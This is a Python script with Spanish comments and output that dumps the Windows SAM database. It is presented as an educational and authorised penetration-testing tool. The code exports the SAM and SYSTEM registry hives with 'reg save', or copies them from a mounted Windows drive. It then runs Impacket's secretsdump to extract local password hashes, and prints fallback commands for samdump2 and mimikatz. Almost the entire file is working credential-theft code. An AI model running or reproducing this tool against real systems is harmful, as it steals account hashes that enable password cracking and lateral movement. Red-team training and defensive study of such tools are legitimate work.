#!/usr/bin/env python3
"""
Script de Volcado de Base de Datos SAM
SAM Database Dump Script

Autor: RedTeam-Bypass
Versión: 1.0
Propósito: Educativo / Pruebas de penetración autorizadas
Purpose: Educational / Authorized Penetration Testing

ADVERTENCIA: Este script es solo para uso educativo y pruebas autorizadas.
WARNING: This script is for educational and authorized testing only.
"""

import os
import sys
import platform
import subprocess
import tempfile
import shutil
from pathlib import Path
from typing import Optional, Tuple
import argparse

# Colores ANSI para terminal
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    GRAY = '\033[0;37m'
    NC = '\033[0m'  # No Color
    
    @staticmethod
    def disable():
        """Deshabilitar colores para Windows sin soporte ANSI"""
        Colors.RED = ''
        Colors.GREEN = ''
        Colors.YELLOW = ''
        Colors.CYAN = ''
        Colors.WHITE = ''
        Colors.GRAY = ''
        Colors.NC = ''


def print_banner():
    """Mostrar banner del script"""
    print(f"{Colors.CYAN}{'='*60}{Colors.NC}")
    print(f"{Colors.CYAN}   Volcado de Base de Datos SAM - DumpSAM.py{Colors.NC}")
    print(f"{Colors.CYAN}   SAM Database Dump Tool{Colors.NC}")
    print(f"{Colors.CYAN}{'='*60}{Colors.NC}")
    print()


def print_system_info():
    """Mostrar información del sistema"""
    print(f"{Colors.CYAN}[*] Información del Sistema:{Colors.NC}")
    print(f"{Colors.WHITE}    Plataforma:         {platform.system()} {platform.release()}{Colors.NC}")
    print(f"{Colors.WHITE}    Arquitectura:       {platform.machine()}{Colors.NC}")
    print(f"{Colors.WHITE}    Nodo:               {platform.node()}{Colors.NC}")
    print(f"{Colors.WHITE}    Usuario:            {os.getenv('USERNAME', os.getenv('USER', 'Desconocido'))}{Colors.NC}")
    print()


def is_admin() -> bool:
    """Verificar si el script se ejecuta con privilegios de administrador"""
    try:
        if platform.system() == 'Windows':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False


def print_sam_info():
    """Mostrar información educativa sobre la base de datos SAM"""
    print(f"{Colors.CYAN}[*] Información sobre la Base de Datos SAM:{Colors.NC}")
    print()
    print(f"{Colors.WHITE}La base de datos Security Account Manager (SAM) contiene:{Colors.NC}")
    print(f"{Colors.GRAY}  - Nombres de usuario locales{Colors.NC}")
    print(f"{Colors.GRAY}  - Hashes de contraseñas (NT hash, LM hash obsoleto){Colors.NC}")
    print(f"{Colors.GRAY}  - SIDs (Security Identifiers){Colors.NC}")
    print(f"{Colors.GRAY}  - Membresías de grupos{Colors.NC}")
    print()
    print(f"{Colors.GRAY}Ubicación en Windows:{Colors.NC}")
    print(f"{Colors.GRAY}  - Archivo: C:\\Windows\\System32\\config\\SAM{Colors.NC}")
    print(f"{Colors.GRAY}  - Registro: HKLM\\SAM\\SAM\\Domains\\Account\\Users{Colors.NC}")
    print()
    print(f"{Colors.GRAY}Estructura de cifrado de hashes:{Colors.NC}")
    print(f"{Colors.GRAY}  1. Hash MD4 de la contraseña (NT hash){Colors.NC}")
    print(f"{Colors.GRAY}  2. Cifrado DES con RID del usuario como clave{Colors.NC}")
    print(f"{Colors.GRAY}  3. Cifrado con Password Encryption Key (PEK){Colors.NC}")
    print(f"{Colors.GRAY}  4. PEK cifrado con LSA System Key{Colors.NC}")
    print()


def find_sam_files() -> Tuple[Optional[Path], Optional[Path]]:
    """Buscar archivos SAM y SYSTEM en el sistema"""
    print(f"{Colors.YELLOW}[*] Buscando archivos SAM en el sistema...{Colors.NC}")
    
    if platform.system() == 'Windows':
        sam_locations = [
            Path(r"C:\Windows\System32\config\SAM"),
            Path(r"C:\Windows\System32\config\RegBack\SAM"),
        ]
        system_locations = [
            Path(r"C:\Windows\System32\config\SYSTEM"),
            Path(r"C:\Windows\System32\config\RegBack\SYSTEM"),
        ]
    else:
        # Para sistemas Linux con Windows montado
        sam_locations = [
            Path("/mnt/c/Windows/System32/config/SAM"),
            Path("/media/Windows/System32/config/SAM"),
        ]
        system_locations = [
            Path("/mnt/c/Windows/System32/config/SYSTEM"),
            Path("/media/Windows/System32/config/SYSTEM"),
        ]
    
    sam_file = None
    system_file = None
    
    # Buscar archivo SAM
    for location in sam_locations:
        if location.exists():
            sam_file = location
            print(f"{Colors.GREEN}[+] Archivo SAM encontrado: {sam_file}{Colors.NC}")
            break
    
    # Buscar archivo SYSTEM
    for location in system_locations:
        if location.exists():
            system_file = location
            print(f"{Colors.GREEN}[+] Archivo SYSTEM encontrado: {system_file}{Colors.NC}")
            break
    
    if not sam_file or not system_file:
        print(f"{Colors.YELLOW}[!] No se encontraron archivos SAM/SYSTEM{Colors.NC}")
    
    print()
    return sam_file, system_file


def export_registry_keys_windows(output_dir: Path) -> bool:
    """Exportar claves de registro en Windows usando reg.exe"""
    print(f"{Colors.YELLOW}[*] Exportando claves de registro...{Colors.NC}")
    
    sam_output = output_dir / "sam.hive"
    system_output = output_dir / "system.hive"
    
    try:
        # Exportar SAM
        print(f"{Colors.YELLOW}[*] Exportando clave SAM...{Colors.NC}")
        result = subprocess.run(
            ["reg", "save", "HKLM\\SAM", str(sam_output)],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            print(f"{Colors.RED}[!] Error al exportar SAM: {result.stderr}{Colors.NC}")
            return False
        
        # Exportar SYSTEM
        print(f"{Colors.YELLOW}[*] Exportando clave SYSTEM...{Colors.NC}")
        result = subprocess.run(
            ["reg", "save", "HKLM\\SYSTEM", str(system_output)],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            print(f"{Colors.RED}[!] Error al exportar SYSTEM: {result.stderr}{Colors.NC}")
            return False
        
        print(f"{Colors.GREEN}[+] Claves exportadas exitosamente{Colors.NC}")
        print(f"{Colors.WHITE}    SAM:    {sam_output}{Colors.NC}")
        print(f"{Colors.WHITE}    SYSTEM: {system_output}{Colors.NC}")
        print()
        return True
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error durante la exportación: {e}{Colors.NC}")
        return False


def copy_sam_files(sam_file: Path, system_file: Path, output_dir: Path) -> bool:
    """Copiar archivos SAM y SYSTEM al directorio de salida"""
    print(f"{Colors.YELLOW}[*] Copiando archivos SAM y SYSTEM...{Colors.NC}")
    
    try:
        sam_output = output_dir / "sam.hive"
        system_output = output_dir / "system.hive"
        
        shutil.copy2(sam_file, sam_output)
        print(f"{Colors.GREEN}[+] SAM copiado a: {sam_output}{Colors.NC}")
        
        shutil.copy2(system_file, system_output)
        print(f"{Colors.GREEN}[+] SYSTEM copiado a: {system_output}{Colors.NC}")
        
        print()
        return True
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error al copiar archivos: {e}{Colors.NC}")
        return False


def extract_hashes_impacket(sam_file: Path, system_file: Path):
    """Extraer hashes usando secretsdump.py de Impacket"""
    try:
        # Verificar si impacket está instalado
        result = subprocess.run(
            ["python", "-c", "import impacket"],
            capture_output=True
        )
        
        if result.returncode != 0:
            print(f"{Colors.YELLOW}[!] Impacket no está instalado{Colors.NC}")
            return False
        
        print(f"{Colors.GREEN}[+] Extrayendo hashes con secretsdump.py...{Colors.NC}")
        print()
        
        # Ejecutar secretsdump.py
        subprocess.run([
            "python", "-m", "impacket.examples.secretsdump",
            "-sam", str(sam_file),
            "-system", str(system_file),
            "LOCAL"
        ])
        
        return True
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error con secretsdump: {e}{Colors.NC}")
        return False


def show_extraction_tools(sam_file: Path, system_file: Path):
    """Mostrar información sobre herramientas de extracción"""
    print(f"{Colors.CYAN}[*] Herramientas disponibles para extraer hashes:{Colors.NC}")
    print()
    print(f"{Colors.WHITE}1. secretsdump.py (Impacket){Colors.NC}")
    print(f"{Colors.GRAY}   Instalación: pip install impacket{Colors.NC}")
    print(f"{Colors.GRAY}   Uso: python -m impacket.examples.secretsdump -sam {sam_file} -system {system_file} LOCAL{Colors.NC}")
    print()
    print(f"{Colors.WHITE}2. samdump2 (Linux){Colors.NC}")
    print(f"{Colors.GRAY}   Instalación: apt-get install samdump2{Colors.NC}")
    print(f"{Colors.GRAY}   Uso: samdump2 {system_file} {sam_file}{Colors.NC}")
    print()
    print(f"{Colors.WHITE}3. mimikatz (Windows){Colors.NC}")
    print(f"{Colors.GRAY}   Uso: lsadump::sam /sam:{sam_file} /system:{system_file}{Colors.NC}")
    print()


def main():
    """Función principal"""
    parser = argparse.ArgumentParser(
        description='Script de volcado de la base de datos SAM',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='ADVERTENCIA: Solo para uso educativo y pruebas autorizadas'
    )
    parser.add_argument('-o', '--output', type=Path, help='Directorio de salida para archivos')
    parser.add_argument('--no-color', action='store_true', help='Deshabilitar colores')
    parser.add_argument('--sam', type=Path, help='Ruta al archivo SAM')
    parser.add_argument('--system', type=Path, help='Ruta al archivo SYSTEM')
    
    args = parser.parse_args()
    
    # Deshabilitar colores si se solicita
    if args.no_color or platform.system() == 'Windows':
        Colors.disable()
    
    # Mostrar banner e información
    print_banner()
    print_system_info()
    
    # Verificar privilegios de administrador
    if not is_admin():
        print(f"{Colors.RED}[!] ADVERTENCIA: Este script requiere privilegios de administrador{Colors.NC}")
        print(f"{Colors.RED}[!] Por favor, ejecute como administrador/root{Colors.NC}")
        print()
        response = input(f"{Colors.YELLOW}[?] ¿Desea continuar de todos modos? (s/n): {Colors.NC}")
        if response.lower() not in ['s', 'y', 'si', 'yes']:
            sys.exit(1)
    else:
        print(f"{Colors.GREEN}[+] Ejecutando con privilegios de administrador{Colors.NC}")
    
    print()
    
    # Mostrar información sobre SAM
    print_sam_info()
    
    # Crear directorio de salida
    if args.output:
        output_dir = args.output
        output_dir.mkdir(parents=True, exist_ok=True)
    else:
        output_dir = Path(tempfile.mkdtemp(prefix="sam_dump_"))
    
    print(f"{Colors.CYAN}[*] Directorio de salida: {output_dir}{Colors.NC}")
    print()
    
    # Buscar o usar archivos especificados
    if args.sam and args.system:
        sam_file = args.sam
        system_file = args.system
        if not sam_file.exists() or not system_file.exists():
            print(f"{Colors.RED}[!] Los archivos especificados no existen{Colors.NC}")
            sys.exit(1)
    else:
        if platform.system() == 'Windows':
            # En Windows, intentar exportar desde el registro
            if not export_registry_keys_windows(output_dir):
                print(f"{Colors.RED}[!] Error al exportar claves de registro{Colors.NC}")
                sys.exit(1)
            sam_file = output_dir / "sam.hive"
            system_file = output_dir / "system.hive"
        else:
            # En Linux, buscar archivos montados
            sam_file, system_file = find_sam_files()
            if not sam_file or not system_file:
                print(f"{Colors.RED}[!] No se encontraron archivos SAM/SYSTEM{Colors.NC}")
                sys.exit(1)
            copy_sam_files(sam_file, system_file, output_dir)
            sam_file = output_dir / "sam.hive"
            system_file = output_dir / "system.hive"
    
    # Intentar extraer hashes
    print(f"{Colors.YELLOW}[*] Intentando extraer hashes...{Colors.NC}")
    print()
    
    if not extract_hashes_impacket(sam_file, system_file):
        print()
        show_extraction_tools(sam_file, system_file)
    
    print()
    print(f"{Colors.CYAN}[*] Archivos guardados en: {output_dir}{Colors.NC}")
    print(f"{Colors.CYAN}[*] Proceso completado{Colors.NC}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Operación cancelada por el usuario{Colors.NC}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.NC}")
        sys.exit(1)
